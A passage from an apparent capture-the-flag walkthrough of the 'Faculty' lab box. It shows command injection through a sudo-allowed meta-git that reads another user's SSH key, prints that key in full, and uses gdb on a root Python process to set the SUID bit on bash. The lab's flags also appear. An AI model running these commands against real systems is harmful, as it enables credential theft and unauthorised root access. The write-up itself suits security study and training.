The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have new mail.
Last login: Thu Oct 13 20:33:26 2022 from 10.10.14.77
-bash-5.0$
```

We have a `mbox` file:

```shell
$ cat mbox
From developer@faculty.htb  Tue Nov 10 15:03:02 2020
Return-Path: <developer@faculty.htb>
X-Original-To: gbyolo@faculty.htb
Delivered-To: gbyolo@faculty.htb
Received: by faculty.htb (Postfix, from userid 1001)
	id 0399E26125A; Tue, 10 Nov 2020 15:03:02 +0100 (CET)
Subject: Faculty group
To: <gbyolo@faculty.htb>
X-Mailer: mail (GNU Mailutils 3.7)
Message-Id: <20201110140302.0399E26125A@faculty.htb>
Date: Tue, 10 Nov 2020 15:03:02 +0100 (CET)
From: developer@faculty.htb
X-IMAPbase: 1605016995 2
Status: O
X-UID: 1

Hi gbyolo, you can now manage git repositories belonging to the faculty group. Please check and if you have troubles just let me know!\ndeveloper@faculty.htb
```

Let's see how `sudo` has been configured:

```shell
$ sudo -l
Matching Defaults entries for gbyolo on faculty:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User gbyolo may run the following commands on faculty:
    (developer) /usr/local/bin/meta-git
```

As we can see, we can run `meta-git` as `developer`. `meta-git`, has a RCE vulnerability ([https://hackerone.com/reports/728040](https://hackerone.com/reports/728040)):

```shell
$ sudo -u developer meta-git clone 'asdf; ls'
meta git cloning into 'ls' at ls

ls:
fatal: repository 'ls' does not exist
ls: command 'git clone ls ls' exited with error: Error: Command failed: git clone ls ls
(node:63078) UnhandledPromiseRejectionWarning: Error: ENOENT: no such file or directory, chdir '/home/gbyolo/ls'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:63078) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 2)
(node:63078) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
```

We can use this to read the SSH key:

```shell
$ cd /tmp
$ sudo -u developer meta-git clone 'sss||cat /home/developer/.ssh/id_rsa'
meta git cloning into 'sss||cat /home/developer/.ssh/id_rsa' at id_rsa

id_rsa:
fatal: repository 'sss' does not exist
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
id_rsa ✓
(node:63934) UnhandledPromiseRejectionWarning: Error: ENOTDIR: not a directory, chdir '/tmp/id_rsa'
    at process.chdir (internal/process/main_thread_only.js:31:12)
    at exec (/usr/local/lib/node_modules/meta-git/bin/meta-git-clone:27:11)
    at execPromise.then.catch.errorMessage (/usr/local/lib/node_modules/meta-git/node_modules/meta-exec/index.js:104:22)
    at process._tickCallback (internal/process/next_tick.js:68:7)
    at Function.Module.runMain (internal/modules/cjs/loader.js:834:11)
    at startup (internal/bootstrap/node.js:283:19)
    at bootstrapNodeJSCore (internal/bootstrap/node.js:623:3)
(node:63934) UnhandledPromiseRejectionWarning: Unhandled promise rejection. This error originated either by throwing inside of an async function without a catch block, or by rejecting a promise which was not handled with .catch(). (rejection id: 1)
(node:63934) [DEP0018] DeprecationWarning: Unhandled promise rejections are deprecated. In the future, promise rejections that are not handled will terminate the Node.js process with a non-zero exit code.
```

Let's add this SSH key to our local VM:

```shell
cat > ~/.ssh/id_rsa <<EOT
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
EOT
chmod 600 ~/.ssh/id_rsa
```

And we are in:

```shell
$ ssh developer@10.10.11.169
Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-121-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Oct 13 20:54:58 CEST 2022

  System load:           0.0
  Usage of /:            82.5% of 4.67GB
  Memory usage:          45%
  Swap usage:            0%
  Processes:             234
  Users logged in:       1
  IPv4 address for eth0: 10.10.11.169
  IPv6 address for eth0: dead:beef::250:56ff:feb9:63db


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Oct 13 11:05:59 2022 from 10.10.14.94
-bash-5.0$ whoami
developer
```

We can now get the user flag:

```shell
$ cat user.txt
a2542ec10fe984b1113a65f53836ef66
```

Let's escalate to root. We have gdb on the host:

```shell
$ ls -la
$ ls -la
total 8292
drwxr-x--- 6 developer developer    4096 Oct 13 11:36 .
drwxr-xr-x 4 root      root         4096 Jun 23 18:50 ..
lrwxrwxrwx 1 developer developer       9 Oct 24  2020 .bash_history -> /dev/null
-rw-r--r-- 1 developer developer     220 Oct 24  2020 .bash_logout
-rw-r--r-- 1 developer developer    3771 Oct 24  2020 .bashrc
drwx------ 2 developer developer    4096 Jun 23 18:50 .cache
drwx------ 3 developer developer    4096 Oct 13 09:52 .gnupg
drwxrwxr-x 3 developer developer    4096 Jun 23 18:50 .local
-rw-r--r-- 1 developer developer     807 Oct 24  2020 .profile
drwxr-xr-x 2 developer developer    4096 Jun 23 18:50 .ssh
-rw------- 1 developer developer    1375 Oct 13 09:53 .viminfo
-rwxr-x--- 1 developer developer 8440200 Oct 13 11:36 gdb
-rwxrwxr-x 1 developer developer     258 Nov 10  2020 sendmail.sh
-rw-r----- 1 root      developer      33 Oct 13 07:11 user.txt
```

However this gdb is owned by `developer`; `/usr/bin/gdb` is accessible to us however:

```shell
$ ls -la /usr/bin/gdb
-rwxr-x--- 1 root debug 8440200 Dec  8  2021 /usr/bin/gdb
$ groups
developer debug faculty
```

Maybe we can take over one of the processes running as root and execute something:

```shell
$ ps -U root -u root u
# ...
root         930  0.0  0.0   2608   536 ?        Ss   07:10   0:00 /bin/sh -c bash /root/service_check.sh
root         931  0.0  0.1   5648  3040 ?        S    07:10   0:03 bash /root/service_check.sh
root         943  0.0  0.3  12172  7264 ?        Ss   07:10   0:00 sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
root         960  0.0  0.0   2860  1656 tty1     Ss+  07:10   0:00 /sbin/agetty -o -p -- \u --noclear tty1 linux
root        1572  0.0  0.2  38072  4628 ?        Ss   07:11   0:00 /usr/lib/postfix/sbin/master -w
root       60137  0.0  0.4  13952  9060 ?        Ss   19:27   0:00 sshd: gbyolo [priv]
root       61755  0.0  0.0      0     0 ?        I    20:09   0:01 [kworker/1:1-events]
root       62500  0.0  0.4  13948  9044 ?        Ss   20:33   0:00 sshd: gbyolo [priv]
root       62906  0.0  0.0      0     0 ?        I    20:38   0:00 [kworker/u256:2-events_unbound]
root       62911  0.0  0.0      0     0 ?        I    20:39   0:00 [kworker/1:2-events]
root       62974  0.0  0.0      0     0 ?        I    20:39   0:00 [kworker/0:2-cgroup_destroy]
root       62977  0.0  0.0      0     0 ?        I    20:39   0:00 [kworker/0:3-events]
root       63677  0.0  0.0      0     0 ?        I    20:50   0:00 [kworker/u256:1-events_unbound]
root       64013  0.0  0.0      0     0 ?        I    20:54   0:00 [kworker/0:0-events]
root       64014  0.0  0.0      0     0 ?        I    20:54   0:00 [kworker/1:0-events]
root       64031  0.0  0.4  13792  8984 ?        Ss   20:54   0:00 sshd: developer [priv]
root       64307  0.0  0.0   4260   516 ?        S    20:58   0:00 sleep 20
```

Let's choose Postfix:

```sh
$ gdb -p 1572
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
Copyright (C) 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word".
Attaching to process 1572
Reading symbols from /usr/lib/postfix/sbin/master...
(No debugging symbols found in /usr/lib/postfix/sbin/master)
Reading symbols from /lib64/ld-linux-x86-64.so.2...
Reading symbols from /usr/lib/debug/.build-id/45/87364908de169dec62ffa538170118c1c3a078.debug...
0x00007f1bce01442a in _start () from /lib64/ld-linux-x86-64.so.2
(gdb)
```

We can now try and escalate with SUID (see https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/):

```shell
(gdb) call (void)system("chmod u+s /bin/bash")
No symbol "system" in current context.
```

But we can't, cause there are no debug symbols. Let's use a Python process instead:

```shell
$ ps -U root -u root u | grep python
root         719  0.0  0.8  26896 17940 ?        Ss   07:10   0:00 /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-triggers
```

And attach GDB, then run SUID bits for bash using the process running as root:

```shell
$ gdb -p 719
(gdb) call (void)system("chmod u+s /bin/bash")
[Detaching after vfork from child process 64874]
```

Exit, and start bash:

```shell
$ bash -p
bash-5.0# whoami
root
```

There are some files in `/root`:

```shell
# ls /root/
check_cron.sh  root.txt  service_check.sh
# cat /root/root.txt
b2107f909ec0fd1c66f1c9a1240c93ee
```

And we have the root flag!
